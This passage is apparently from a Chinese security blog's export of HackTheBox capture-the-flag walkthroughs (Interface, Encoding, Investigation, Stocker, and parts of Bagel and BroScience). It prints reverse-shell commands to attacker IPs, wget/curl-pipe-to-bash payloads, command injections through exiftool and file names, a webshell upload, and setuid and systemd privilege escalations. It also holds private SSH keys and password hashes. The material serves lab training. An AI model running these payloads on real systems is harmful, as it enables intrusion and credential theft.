0ys&#x2F;ku5S+MEfyPrGlb4&#x2F;CoKGLQwhNbFVX7VGYZBSJki9gKcSL+7WJniW6Jm2H39UqoxwJHV&#x2F;VSgNIDNM0u27rd&#x2F;5JWKuoN5fjRGTgjNPyPt9KGgaFwo77qTLMImP6FfVBexza7g3aNOoRLtMpgKBp4p12qYfqM43WNez8TbahX03mAYAaIkVu4Z2N3Gab93S6s0IhKh5bJ8doWvwPFIby6mAOj367ixDMSVaA6Zr75&#x2F;chVsVNWL5KmGiHYqzrV&#x2F;4duYL30zb5c8bsDXM40u4Bj+FwwAAAAMBAAEAAAGABzEAtDbmTvinykHgKgKfg6OuUxU+DL5C1WuA&#x2F;QAWuz44maOmOmCjdZA1M+vmzbzU+NRMZtYJhlsNzAQLN2dKuIw56+xnnBrxzFMSTw5IBcPoEFWxzvaqs4OFD&#x2F;QGM0CBDKY1WYLpXGyfXv&#x2F;ZkXmpLLbsHAgpD2ZV6ovwy91L971xdGaLx3e3VBtb5q3VXyFs4UF4N71kXmuoBzG6OImluf+vI&#x2F;tgCXv38uXhcK66odgQPn6CTk0VsD5oLVUYjfZ0ipmfIb1rCXL410V7H1DNeUJeg4hFjzxQnRUiWb2Wmwjx5efeORO1eDvHML3&#x2F;X4WivARfd7XMZZyfB3JNJbynVRZPr&#x2F;DEJ&#x2F;owKRDSjbzem81TiO4Zh06OiiqS+itCwDdFq4RvAF+YlK9Mmit3&#x2F;QbMVTsL7GodRAvRzsf1dFB+Ot+tNMU73Uy1hzIi06J57PWRATokDV&#x2F;Ta7gYeuGJfjdb5cu61oTKbXdUV9WtyBhk1IjJ9l0Bit&#x2F;mQyTRmJ5KH+CtAAAAwFpnmvzlvR+gubfmAhybWapfAn5+3yTDjcLSMdYmTcjoBOgC4lsgGYGd7GsuIMgowwrGDJvE1yAS1vCest9D51grY4uLtjJ65KQ249fwbsOMJKZ8xppWE3jPxBWmHHUok8VXx2jL0B6nxQWmaLh5egc0gyZQhOmhO&#x2F;5g&#x2F;WwzTpLcfD093V6eMevWDCirXrsQqyIenEA1WN1Dcn+V7rDyLjljQtfPG6wXinfmb18qP3e9NT9MR8SKgl&#x2F;sRiEf8f19CAAAAMEA&#x2F;8ZJy69MY0fvLDHTWhI0LFnIVoBab3r3Ys5o4RzacsHPvVeUuwJwqCT&#x2F;IpIp7pVxWwS5mXiFFVtiwjeHqpsNZKEU1QTQZ5ydok7yi57xYLxsprUcrH1a4&#x2F;x4KjD1Y9ijCM24DknenyjrB0l2DsKbBBUT42RbzHYDsq2CatGezy1fx4EGFoBQ5nEl7LNcdGBhqnssQsmtB&#x2F;Bsx94LCZQcsIBkIHXB8fraNmiOExHKnkuSVqEBwWi5A2UPft+avpJfAAAAwQC6PBf90h7mG&#x2F;zECXFPQVIPj1uKrwRb6V9gGDCXgqXxMqTaZd348xEnKLkUnOrFbk3RzDBcw49GXaQlPPSM4z05AMJzixi0xO25XO&#x2F;Zp2iH8ESvo55GCvDQXTH6if7dSVHtmf5MSbM5YqlXw2BlL&#x2F;yqT+DmBsuADQYU19aO9LWUIhJjeHolE3PVPNAeZe4zIfjaN9Gcu4NWgA6YS5jpVUE2UyyWIKPrBJcmNDCGzY7EqthzQzWr4KnrEIIvsBGmrx0AAAAKcGhpbEBiYWdlbAE&#x3D;-----END OPENSSH PRIVATE KEY----- user flag使用读取到的私钥登录： 提权信息使用前面db里得到的密码可以切到developer用户，developer用户可以无条件以root权限运行dotnet： 我们可以通过dotnet交互式控制台运行任意代码执行命令： Execute shell commands in F# - Alexandru Nedelcuhttps://alexn.org/blog/2020/12/06/execute-shell-command-in-fsharp/ 提权 &amp; root flag执行代码调用任意命令： 12345678910sudo &#x2F;usr&#x2F;bin&#x2F;dotnet fsiopen System.Diagnostics;let psi &#x3D; new ProcessStartInfo(&quot;chmod&quot;, &quot;u+s &#x2F;bin&#x2F;bash&quot;);psi.UseShellExecute &lt;- false;let process &#x3D; Process.Start(psi);process.WaitForExit() |&gt; ignore;#quit;; shadow123root:$y$j9T$xXlsjHrINuN0kQdFIX.TeDOE$Sg8M.SskkAlI&#x2F;FaZ&#x2F;m0dNi&#x2F;8WBs51yp2di2unqKqO.0::0:99999:7:::developer:$y$j9T$3w2e6AN37Z6b&#x2F;vPqtsZS0&#x2F;$BsehC4AuuJLwBQF4oOyU9jAdy0dr7V2GHXYW7dBJsG4:19287:0:99999:7:::phil:$y$j9T$v0ZxjVDxziVRDtfkwpLhA1$U418uymrKh29qqce2lwWa.5OnZCG&#x2F;Y7d8xYX7x0Q5d7:19287:0:99999:7::: 参考资料 .NET高级代码审计（第二课） Json.Net反序列化漏洞-安全客 - 安全资讯平台https://www.anquanke.com/post/id/172920 Execute shell commands in F# - Alexandru Nedelcuhttps://alexn.org/blog/2020/12/06/execute-shell-command-in-fsharp/ Bagel - HackTheBox - AndresRuizzzzzhttps://andresruizzzzz.github.io/blog/htb-writeup-bagel/# Bagel - HTB [Discussion] | BreachForumshttps://breached.vc/Thread-Bagel-HTB-Discussion","categories":[],"tags":[{"name":"HackTheBox","slug":"HackTheBox","permalink":"https://darkwing.moe/tags/HackTheBox/"}]},{"title":"Interface - HackTheBox","slug":"Interface-HackTheBox","date":"2023-02-13T06:28:54.000Z","updated":"2023-05-15T05:27:28.381Z","comments":true,"path":"2023/02/13/Interface-HackTheBox/","link":"","permalink":"https://darkwing.moe/2023/02/13/Interface-HackTheBox/","excerpt":"","text":"基本信息 https://www.hackthebox.com/home/machines/profile/527 10.10.11.200 端口扫描22和80: 123456789101112131415161718$ nmap -sC -sV -Pn 10.10.11.200Starting Nmap 7.93 ( https://nmap.org ) at 2023-02-13 13:15 CSTNmap scan report for 10.10.11.200Host is up (0.075s latency).Not shown: 998 closed tcp ports (conn-refused)PORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)| ssh-hostkey:| 2048 7289a0957eceaea8596b2d2dbc90b55a (RSA)| 256 01848c66d34ec4b1611f2d4d389c42c3 (ECDSA)|_ 256 cc62905560a658629e6b80105c799b55 (ED25519)80/tcp open http nginx 1.14.0 (Ubuntu)|_http-server-header: nginx/1.14.0 (Ubuntu)|_http-title: Site MaintenanceService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelService detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 25.39 seconds 80没什么东西，但CSP中能得到一个域名： prd.m.rendering-api.interface.htb添加host后直接访问是file not found： 110.10.11.200 prd.m.rendering-api.interface.htb 目录扫描目录扫描发现vendor和api,继续一步步扫描，注意扫描参数: 1234567891011121314151617gobuster dir -w ~/Tools/dict/SecLists/Discovery/Web-Content/common.txt -t 50 -u \"http://prd.m.rendering-api.interface.htb\" -s 200,403,404 -b \"\" --exclude-length 0/api (Status: 404) [Size: 50]/api/experiments (Status: 404) [Size: 50]/api/experiments/configurations (Status: 404) [Size: 50]/vendor (Status: 403) [Size: 15]gobuster dir -w ~/Tools/dict/SecLists/Discovery/Web-Content/raft-medium-directories-lowercase.txt -t 50 -u \"http://prd.m.rendering-api.interface.htb/vendor/\" -s 200,403,404 -b \"\" --exclude-length 0,50/dompdf (Status: 403) [Size: 15]/composer (Status: 403) [Size: 15]ffuf -u http://prd.m.rendering-api.interface.htb/api/FUZZ -X POST -w ~/Tools/dict/SecLists/Discovery/Web-Content/raft-medium-directories-lowercase.txt -mc all -fs 50[Status: 422, Size: 36, Words: 2, Lines: 1, Duration: 108ms] * FUZZ: html2pdf dompdf根据已有信息进行搜索，发现dompdf相关漏洞： From XSS to RCE (dompdf 0day) | Positive Securityhttps://positive.security/blog/dompdf-rce positive-security/dompdf-rce: RCE exploit for dompdfhttps://github.com/positive-security/dompdf-rce 根据前面的结果，应该是html2pdf调用了pdf，我们需要通过这个api利用dompdf的漏洞： (pentesterlab里也有dompdf相关的，也可以去做一下) 就是用github里的内容，修改exploit.css中的php链接，修改php文件中的代码，通过html2pdf上传字体文件(参数格式也是常规fuzz)： 然后根据命名规则计算出服务器上webshell的路径： 1234$ echo -n 'http://10.10.14.10:7777/exploit_font.php' | md5sum78e00b92375ea46740203760ffdd85fd -http://prd.m.rendering-api.interface.htb/vendor/dompdf/dompdf/lib/fonts/exploitfont_normal_78e00b92375ea46740203760ffdd85fd.php?cmd=whoami reverse shell user flag得到的是www-data shell,但有权限读dev用户目录的user.txt: 提权信息root权限定时运行/usr/local/sbin/cleancache.sh，查看内容发现是通过exiftool检查/tmp目录下的文件的Producer是否是dompdf，然后进行清理，我们可以利用这一点进行命令注入： 提权 &amp; root flag准备一个要执行的文件，因为已经知道tmp目录有自动清理，所有使用其他可写目录: 12345678bash-4.4$ cat &gt; /dev/shm/shell.sh &lt;&lt; EOFcat &gt; /dev/shm/shell.sh &lt;&lt; EOF&gt; #!/bin/bash#!/bin/bash&gt; chmod +s /bin/bashchmod +s /bin/bash&gt; EOFbash-4.4$ chmod +x /dev/shm/shell.sh tmp目录下创建一个文件，修改Producer进行命令注入，等待触发： 1/usr/bin/exiftool -Producer='a[$(/dev/shm/shell.sh&gt;&amp;2)]+42' /tmp/exp shadow12root:$6$vNqg&#x2F;kOl$yP48ihB9Tz5fyR0bjFvDk&#x2F;ZMwmOpr&#x2F;a6Bx7Z3fpsTNQM.k2ip0weEHpNr2C0OY2qEIspg4KuTtB3R32.bPieX0:19316:0:99999:7:::dev:$6$2RlsJ6Cm$3qBSlRXSbX0tjTK7orUlt3Wub&#x2F;ahd1f5kAVDhnvd8zm2vFuPotd7o04vH04OgPjdvsfUp2sOpqQJz5Cge2h4C0:19367:0:99999:7::: 参考资料 From XSS to RCE (dompdf 0day) | Positive Securityhttps://positive.security/blog/dompdf-rce positive-security/dompdf-rce: RCE exploit for dompdfhttps://github.com/positive-security/dompdf-rce Interface - HTB [Discussion] | BreachForumshttps://breached.vc/Thread-Interface-HTB-Discussion","categories":[],"tags":[{"name":"HackTheBox","slug":"HackTheBox","permalink":"https://darkwing.moe/tags/HackTheBox/"}]},{"title":"Encoding - HackTheBox","slug":"Encoding-HackTheBox","date":"2023-02-02T07:44:30.000Z","updated":"2023-04-17T00:51:41.690Z","comments":true,"path":"2023/02/02/Encoding-HackTheBox/","link":"","permalink":"https://darkwing.moe/2023/02/02/Encoding-HackTheBox/","excerpt":"","text":"基本信息 https://www.hackthebox.com/home/machines/profile/526 10.10.11.198 端口扫描22和80: 1234567891011121314151617$ nmap -sC -sV -Pn 10.10.11.198Starting Nmap 7.93 ( https://nmap.org ) at 2023-02-02 13:38 CSTNmap scan report for 10.10.11.198Host is up (0.096s latency).Not shown: 998 closed tcp ports (conn-refused)PORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)| ssh-hostkey:| 256 4fe3a667a227f9118dc30ed773a02c28 (ECDSA)|_ 256 816e78766b8aea7d1babd436b7f8ecc4 (ED25519)80/tcp open http Apache httpd 2.4.52 ((Ubuntu))|_http-server-header: Apache/2.4.52 (Ubuntu)|_http-title: HaxTablesService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelService detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 33.02 seconds 80API中得到域名信息： 子域名扫描根据得到的域名格式添加hosts，继续探测子域名： 110.10.11.198 haxtables.htb api.haxtables.htb 发现另一个image： 1234ffuf -w ~/Tools/dict/SecLists/Discovery/DNS/subdomains-top1million-5000.txt -u \"http://haxtables.htb/\" -H 'Host: FUZZ.haxtables.htb' -fs 1999api [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 111ms]image [Status: 403, Size: 284, Words: 20, Lines: 10, Duration: 95ms] image.haxtables.htb添加hosts，直接访问是403: api.haxtables.htb根据给出的api调用代码调用api，发现一个读取远程文件的调用方式，这里可以LFI： LFI image .git一步步读文件,utils里发现git： 123file:&#x2F;&#x2F;&#x2F;var&#x2F;www&#x2F;html&#x2F;index.phpfile:&#x2F;&#x2F;&#x2F;var&#x2F;www&#x2F;image&#x2F;index.phpfile:&#x2F;&#x2F;&#x2F;var&#x2F;www&#x2F;image&#x2F;utils.php image.haxtables.htb通过git dump代码,但因为image的403限制，需要改下工具代码： GitTools/Dumper at master · internetwache/GitToolshttps://github.com/internetwache/GitTools/tree/master/Dumper 修改后的版本： gitdumper to download .git directory only for HackTheBox “Encoding” machinehttps://gist.github.com/EmmanuelCruzL/e309615e2951079e25b8bba7a13e8385 然后dump git信息： 1./gitdumper.sh http://image.haxtables.htb/.git/ image_git_dump git信息的到的一些文件名，继续使用前面的LFI读代码： actions/action_handler.phpaction_handler中发现LFI： 12345678910111213&lt;?phpinclude_once 'utils.php';if (isset($_GET['page'])) &#123; $page = $_GET['page']; include($page);&#125; else &#123; echo jsonify(['message' =&gt; 'No page specified!']);&#125;?&gt; handler.php主站的handler中发现SSRF，接收到的uri_path会进入make_api_call,拼接在中间，所以也需要处理一下： 12file:&#x2F;&#x2F;&#x2F;var&#x2F;www&#x2F;html&#x2F;handler.phpfile:&#x2F;&#x2F;&#x2F;var&#x2F;www&#x2F;api&#x2F;utils.php SSRF + LFI所以可以通过handler的SSRF去调用image的LFI： LFI to RCE参考资料，和Pollution那台类似： hxp CTF 2021 - The End Of LFI? - 跳跳糖https://tttang.com/archive/1395/ synacktiv/php_filter_chain_generatorhttps://github.com/synacktiv/php_filter_chain_generator 1234# mbash -i &gt;&amp; /dev/tcp/10.10.14.7/4444 0&gt;&amp;1python3 php_filter_chain_generator.py --chain '&lt;?=`wget -O - 10.10.14.7/m|bash`?&gt;' 然后替换page参数，得到shell： svc得到的www shell可以以svc用户权限运行git-commit.sh： 根据代码，用于git commit，可以通过附加Attribute执行其他操作： Git - Git Attributeshttps://git-scm.com/book/en/v2/Customizing-Git-Git-Attributes 我们可以在/var/www/image文件夹中初始化一个新的版本库，为所有.php文件设置缩进过滤器，设置一个运行bash文件的命令来生成反向shell，最后，以svc用户身份运行git-commit.sh文件。 1234567891011#/tmp/shell#!/bin/bashbash -i &gt;&amp; /dev/tcp/10.10.14.7/4444 0&gt;&amp;1chmod +x /tmp/shellcd /var/www/imagegit initecho '*.php filter=indent' &gt; .git/info/attributesgit config filter.indent.clean /tmp/shellsudo -u svc /var/www/image/scripts/git-commit.sh user flagsvc用户目录里可以获取私钥方便后续操作： svc_id_rsa1234567891011121314151617181920212223242526272829303132333435363738-----BEGIN OPENSSH PRIVATE KEY-----b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcnNhAAAAAwEAAQAAAYEAlnPbNrAswX0YLnW3sx1l7WN42hTFVwWISqdx5RUmVmXbdVgDXdzH&#x2F;ZBNxIqqMXE8DWyNpzcV&#x2F;78rkU4f2FF&#x2F;rWH26WfFmaI&#x2F;Zm9sGd5l4NTON2lxAOt+8aUyBRxpVYNSSK+CkahQ2XDO87IyS4HV4cKUYpaN&#x2F;efa+XyoUm6mKiHUbtyUYGAfebSVxU4ur1UevSquljs+Hcpzh5WKRhgu&#x2F;ojBDQdKWd0Q6bn75TfRBSu6u&#x2F;mODjjilvVppGNWJWNrar8eSZvbqMlV509E6Ud2rNopMelmpESZfBEGoJAvEnhFaYylsuC7IPEWMi82&#x2F;3Vyl7RAgeT0zPjqnHiPCJykLYvxkvsRnIBFxesZL+AkbHYHEn3fyH16Pp8ZZmIIJN3WQD&#x2F;SRJOTDh&#x2F;fmWy6r7oD+urq6+rEqTV0UGDk3YXhhep&#x2F;LYnszZAZ2HNainM+iwtpDTr3rw+B+OH6Z8Zla1YvBFvLoQOAsqE2FUHeEpRspb57uDeKWbkrNLU5cYUhuWBLAAAFiEyJeU9MiXlPAAAAB3NzaC1yc2EAAAGBAJZz2zawLMF9GC51t7MdZe1jeNoUxVcFiEqnceUVJlZl23VYA13cx&#x2F;2QTcSKqjFxPA1sjac3Ff+&#x2F;K5FOH9hRf61h9ulnxZmiP2ZvbBneZeDUzjdpcQDrfvGlMgUcaVWDUkivgpGoUNlwzvOyMkuB1eHClGKWjf3n2vl8qFJupioh1G7clGBgH3m0lcVOLq9VHr0qrpY7Ph3Kc4eVikYYLv6IwQ0HSlndEOm5++U30QUrurv5jg444pb1aaRjViVja2q&#x2F;Hkmb26jJVedPROlHdqzaKTHpZqREmXwRBqCQLxJ4RWmMpbLguyDxFjIvNv91cpe0QIHk9Mz46px4jwicpC2L8ZL7EZyARcXrGS&#x2F;gJGx2BxJ938h9ej6fGWZiCCTd1kA&#x2F;0kSTkw4f35lsuq+6A&#x2F;rq6uvqxKk1dFBg5N2F4YXqfy2J7M2QGdhzWopzPosLaQ06968Pgfjh+mfGZWtWLwRby6EDgLKhNhVB3hKUbKW+e7g3ilm5KzS1OXGFIblgSwAAAAMBAAEAAAGAF7nXhQ1NUYoHqTP5Ly7gpwn7wfBqmmmN76&#x2F;uPyERtahEboHdrgymIS+DhA4V&#x2F;swLm1ZWFFuUhYtBNJ3sWbGof9AmHvK1b5&#x2F;tfZruojm3OTh1+LkREAMTNspFVBcB6XFXJY0&#x2F;+vZfIZsvl7CvS8cC0qJbwhxZ8gOBPbzR0oYOgDBrjrwMThJ6hDfdMos8w3uZ6Fz1wU1AY3RMucH0V09zAcLRJtvSds9s3l7tAV3HAZi+zuvw4f9IhGPZMApWSHkf9nsIFD1miD9n31E5uFYHxF+4OIYBw+IvWoH2f3JkzWpTh845p0VyX4+8SdEhONX7CkdprVnfeLH8+cuxhFSKE4Vlz5Zer0HvESIpMq0sHp3zcKP8wIBF30USabakUHBmd&#x2F;k4Ssw6oUg06hLm5xRI8d8kDJ2JhE9AmM4jSuW+kuHzTn&#x2F;xpK+VQHVKNhASbDEO436iRABccefgHzTTLJaUKnDQvHVT5mE5xwYdIBpchN2O8z9VgkkKt0LVtPU1HauxAAAAwAw5Y6bFzH3wtun0gOtWfLfm6pluFtdhPivtjXNr+4kqxVfcq1vriwjzpSTiZXtDXfdvWnBN2rpzw5l0ZCmhLBxVl+qUNQo0RWCNOC6BRm3Tfyt&#x2F;FddoDkQdl83zs5ts8A6w3aAynGv3Qrh3bR&#x2F;LvxvvCGynS5iHedOBMCBl5zqgBni&#x2F;EsaQuGGD6&#x2F;4Vi7o2z+i1U7&#x2F;EUuQ3eeJ&#x2F;piMGXN&#x2F;7r1Ey3IinPA5omtDn9FplaoljCHfRkH8XIOjxle0+sQAAAMEAvZcUrFEfQES3J8yrDWk2ts8UL1iX4G4LqD34f7AUEtj4Jnr&#x2F;D6fnl&#x2F;FOSKuCK+Z4OFCh74H0mogGAOvC1bKCkD&#x2F;Q&#x2F;KSdSb2x&#x2F;6+EOdBPD7X&#x2F;73W7kiio&#x2F;phrqwARFWZRcX4PyiOeKI6h5UFPERXBOse84pqad01VWSE7ulFwqExaEBtF9kWlruGd&#x2F;C4GmxUkCEpOsBWa1HjhrY36J99fiQDkI8F5xAfQrr5BlTXUg4hYsAx2dA71qDV4NgvuL7QTAAAAwQDLJzsl6ZfIKEYaN1klK1tfJ+yz8Hzgn0+DY0RjyEuNhw2ZbIV7llFeGC7q8NfHKxuO6XQyJBBoTgZTQQSTRO3E1&#x2F;i7fRB73P+++CyIt465ER&#x2F;Evu+QPxwElDkxiQCR9p3wrMwpuR4Aq4RwxkJtZNLcE3o8TOqpxoKXEpOWKZRx52kZF1ul2Aqwml1hQYQGXfr+BCkEdaskZxCTdNL3U548+&#x2F;SpBnh8YXYKMsH2L70JHgo940ZjYn&#x2F;aFyar4fo4+ekAAAAMc3ZjQGVuY29kaW5nAQIDBAUGBw&#x3D;&#x3D;-----END OPENSSH PRIVATE KEY----- 提权 &amp; root flag可以重启任意服务，那就是自己创建一个服务利用了 1234567echo '[Service]Type=oneshotExecStart=bash /tmp/shell[Install]WantedBy=multi-user.target' &gt; /etc/systemd/system/root.servicesudo systemctl restart root shadow12root:$y$j9T$YrcgmNEZARoBVHavwBOPQ&#x2F;$wIZaX9iidgZlQcbd8FsfhAK4e9f6CCS0R8zTG7iGZWC:19307:0:99999:7:::svc:$y$j9T$T1FiJZK9ftARU8F2cRXIo&#x2F;$l4ru4RucHv80YP2Nv2KwwZbJmem.ongM5S8FbfbOTp9:19307:0:99999:7::: 参考资料 GitTools/Dumper at master · internetwache/GitToolshttps://github.com/internetwache/GitTools/tree/master/Dumper gitdumper to download .git directory only for HackTheBox “Encoding” machinehttps://gist.github.com/EmmanuelCruzL/e309615e2951079e25b8bba7a13e8385 hxp CTF 2021 - The End Of LFI? - 跳跳糖https://tttang.com/archive/1395/ synacktiv/php_filter_chain_generatorhttps://github.com/synacktiv/php_filter_chain_generator Git - Git Attributeshttps://git-scm.com/book/en/v2/Customizing-Git-Git-Attributes Encodinghttps://rubikcuv5.notion.site/Encoding-177c03af55f54a51904fc48b14f5f77b Encoding - HTB [Discussion] | BreachForumshttps://breached.vc/Thread-Encoding-HTB-Discussion","categories":[],"tags":[{"name":"HackTheBox","slug":"HackTheBox","permalink":"https://darkwing.moe/tags/HackTheBox/"}]},{"title":"Investigation - HackTheBox","slug":"Investigation-HackTheBox","date":"2023-01-23T06:25:37.000Z","updated":"2023-04-23T00:51:30.339Z","comments":true,"path":"2023/01/23/Investigation-HackTheBox/","link":"","permalink":"https://darkwing.moe/2023/01/23/Investigation-HackTheBox/","excerpt":"","text":"基本信息 https://www.hackthebox.com/home/machines/profile/525 10.10.11.197 端口扫描22和80: 123456789101112131415161718$ nmap -sC -sV -Pn 10.10.11.197Starting Nmap 7.93 ( https://nmap.org ) at 2023-01-23 12:58 CSTNmap scan report for 10.10.11.197Host is up (0.10s latency).Not shown: 998 closed tcp ports (conn-refused)PORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)| ssh-hostkey:| 3072 2f1e6306aa6ebbcc0d19d4152674c6d9 (RSA)| 256 274520add2faa73a8373d97c79abf30b (ECDSA)|_ 256 4245eb916e21020617b2748bc5834fe0 (ED25519)80/tcp open http Apache httpd 2.4.41|_http-server-header: Apache/2.4.41 (Ubuntu)|_http-title: Did not follow redirect to http://eforenzics.htb/Service Info: Host: eforenzics.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernelService detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 36.10 seconds 80需要加hosts： 110.10.11.197 eforenzics.htb 在线数字取证： ExifTool正常一张图片测试，发现是12.37的Exiftool，搜索发现相关漏洞： Command Injection in Exiftool before 12.38https://gist.github.com/ert-plus/1414276e4cb5d56dd431c2f0429e4429 命令注入文件名注入，可以直接复制重命名方便操作： 1cp miao.jpg \"curl 10.10.14.9 |\" reverse shell有字符限制，可以通过管道得到shell： 1234echo \"sh -i &gt;&amp; /dev/tcp/10.10.14.9/4444 0&gt;&amp;1\" &gt; index.htmlpython -m http.server 80cp miao.jpg \"curl 10.10.14.9 | bash |\" investigation/usr/local/investigation目录中发现一个邮件，其中有个附件里面是windows日志文件： 可以使用在线网站提取附件： Free MSG EML Viewer | Free Online Email Viewerhttps://www.encryptomatic.com/viewer/ 日志分析evtx文件，可以直接使用windows分析，也可以用第三方工具,日志文件中得到密码,就是很常见的误操作场景，把密码当用户名输入了，被记录在日志中： omerbenamram/evtx: A Fast (and safe) parser for the Windows XML Event Log (EVTX) formathttps://github.com/omerbenamram/evtx 12345./evtx_dump-v0.8.0-x86_64-apple-darwin security.evtx -o json &gt; events.jsoncat events.json| grep TargetUserName | grep \"\\!\" \"TargetUserName\": \"Def@ultf0r3nz!csPa$$\", \"TargetUserName\": \"Def@ultf0r3nz!csPa$$\", user flag用户名可以通过在www shell中知道是smorton,使用上面得到的密码登录： 12ssh smorton@10.10.11.197Def@ultf0r3nz!csPa$$ 提权信息sudo可以发现一个binary文件，尝试运行直接退出： 下载下来进行分析: 1scp smorton@10.10.11.197:/usr/bin/binary . binary反编译查看代码逻辑，发现程序运行argc需要是3，所以需要两个参数，第二个参数可以看作密码，校验通过后，使用curl请求第一个参数的内容，写入到第二个参数作为文件名的文件中，然后以root权限使用perl运行这个文件： 提权 &amp; root flag任意perl代码： 12345# root.plsystem(\"chmod u+s /bin/bash\");# targetsudo /usr/bin/binary http://10.10.14.9:7777/root.pl lDnxUysaQn shadow12root:$6$8KeEz2EYMU05RVyS$W5GGqM4AHw3D1tLul.LJN2BPUhqEdflA.yCQyu7&#x2F;c2PtZmbAn6qevqSaUlFyhPQbgbhFmDB00I3Of7qPep2WP&#x2F;:19233:0:99999:7:::smorton:$6$b6pcA0sG5CxXFPzY$QW9XnZAa0B9xm0y8PkNRG497k6lae4q.7zozLTXHu3YE5ElW5Q6ithOG5kbuQOMS8leu1WceWJEJ3J6ImcKVS0:19234:0:99999:7::: 参考资料 Command Injection in Exiftool before 12.38https://gist.github.com/ert-plus/1414276e4cb5d56dd431c2f0429e4429 Free MSG EML Viewer | Free Online Email Viewerhttps://www.encryptomatic.com/viewer/ omerbenamram/evtx: A Fast (and safe) parser for the Windows XML Event Log (EVTX) formathttps://github.com/omerbenamram/evtx Investigation - HTB [Discussion] | BreachForumshttps://breached.vc/Thread-Investigation-HTB-Discussion","categories":[],"tags":[{"name":"HackTheBox","slug":"HackTheBox","permalink":"https://darkwing.moe/tags/HackTheBox/"}]},{"title":"Stocker - HackTheBox","slug":"Stocker-HackTheBox","date":"2023-01-15T09:21:42.000Z","updated":"2023-06-25T00:50:35.700Z","comments":true,"path":"2023/01/15/Stocker-HackTheBox/","link":"","permalink":"https://darkwing.moe/2023/01/15/Stocker-HackTheBox/","excerpt":"","text":"基本信息 https://www.hackthebox.com/home/machines/profile/523 10.10.11.196 端口扫描22和80: 123456789101112131415161718$ nmap -sC -sV -Pn 10.10.11.196Starting Nmap 7.93 ( https://nmap.org ) at 2023-01-15 16:43 CSTNmap scan report for 10.10.11.196Host is up (0.34s latency).Not shown: 998 closed tcp ports (conn-refused)PORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)| ssh-hostkey:| 3072 3d12971d86bc161683608f4f06e6d54e (RSA)| 256 7c4d1a7868ce1200df491037f9ad174f (ECDSA)|_ 256 dd978050a5bacd7d55e827ed28fdaa3b (ED25519)80/tcp open http nginx 1.18.0 (Ubuntu)|_http-title: Did not follow redirect to http://stocker.htb|_http-server-header: nginx/1.18.0 (Ubuntu)Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelService detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 106.79 seconds 80需要加hosts： 110.10.11.196 stocker.htb 子域名扫描子域名可以发现dev： 123ffuf -w ~/Tools/dict/SecLists/Discovery/DNS/subdomains-top1million-5000.txt:FUZZ -u \"http://stocker.htb/\" -H 'Host: FUZZ.stocker.htb' -fs 178dev [Status: 302, Size: 28, Words: 4, Lines: 1, Duration: 423ms] dev同样加hosts后访问,需要登录： NoSQL injection基础的NoSQL injection，需要修改使用json格式，绕过登录： NoSQL injection - HackTrickshttps://book.hacktricks.xyz/pentesting-web/nosql-injection#basic-authentication-bypass LFI订单功能根据提交的参数渲染生成pdf，可以尝试提交iframe之类的，使其渲染时嵌入本地文件： LFI验证可行，后面就是一点点读文件： index.js/var/www/dev/index.js文件中得到密码： 1const dbURI &#x3D; &quot;mongodb:&#x2F;&#x2F;dev:IHeardPassphrasesArePrettySecure@localhost&#x2F;dev?authSource&#x3D;admin&amp;w&#x3D;1&quot;; user flagpasswd中得到的用户名angoose使用这个密码登录，得到user flag： 提权信息sudo使用node运行指定目录下 *.js ： 因为这里是用的是 *.js，那么 /usr/local/scripts/../../../../xxx.js 这种路径也是符合要求的，所以我们就能在可写目录写js文件，使用node运行执行任意命令 提权 &amp; root flag1sudo /usr/bin/node /usr/local/scripts/../../../tmp/exp.js exp.js1const fs = require(\"child_process\").spawn(\"/usr/bin/bash\", &#123;stdio: [0, 1, 2]&#125;) shadow12root:$6$EZqTwEpX4KybzpVB$BO02GOjBAfc&#x2F;gEUXTNVQ3J2xQFeS4sGXNnr&#x2F;zporRnTKZ46fskNi.ijPrSowdfcDn4xi4p.hCGVMaolooyHHv1:19332:0:99999:7:::angoose:$6$8iwZVU6fVD77ubDf$bxwtXVrJQdmmOByc0T2BwfWRe6I3pInHkQD1WmqJ8e5LkzLzDspjNYaRoNMzygN3uhheZRtPFGDfwGlMoCRSG0:19332:0:99999:7::: 参考资料 NoSQL injection - HackTrickshttps://book.hacktricks.xyz/pentesting-web/nosql-injection#basic-authentication-bypass Stocker - HTB [Discussion] | BreachForumshttps://breached.vc/Thread-Stocker-HTB-Discussion","categories":[],"tags":[{"name":"HackTheBox","slug":"HackTheBox","permalink":"https://darkwing.moe/tags/HackTheBox/"}]},{"title":"BroScience - HackTheBox","slug":"BroScience-HackTheBox","date":"2023-01-09T08:14:51.000Z","updated":"2023-04-10T01:06:46.361Z","comments":true,"path":"2023/01/09/BroScience-HackTheBox/","link":"","permalink":"https://darkwing.moe/2023/01/09/BroScience-HackTheBox/","excerpt":"","text":"基本信息 https://www.hackthebox.com/home/machines/profile/521 10.10.11.195 端口扫描22,80,443: 12345678910111213141516171819202122232425262728293031$ nmap -sC -sV -Pn 10.10.11.195Starting Nmap 7.93 ( https://nmap.org ) at 2023-01-09 14:40 CSTNmap scan report for 10.10.11.195Host is up (0.19s latency).Not shown: 997 closed tcp ports (conn-refused)PORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)| ssh-hostkey:| 3072 df17c6bab18222d91db5ebff5d3d2cb7 